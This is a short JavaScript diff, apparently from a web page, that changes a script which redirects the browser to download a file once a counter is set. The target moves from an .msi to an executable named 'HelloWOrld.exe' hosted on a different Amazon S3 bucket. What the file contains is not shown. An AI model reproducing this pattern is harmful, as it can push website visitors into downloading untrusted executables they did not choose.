@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hw-fa.s3.ap-southeast-2.amazonaws.com/HW-final.msi";
+		var url="https://hwent1.s3.ap-southeast-2.amazonaws.com/HelloWOrld.exe";
 		window.location=url;
 	}
 }
@@ -12,6 +12,7 @@ function getLoad()
 {
 	num++;
 }
+
 
 
 
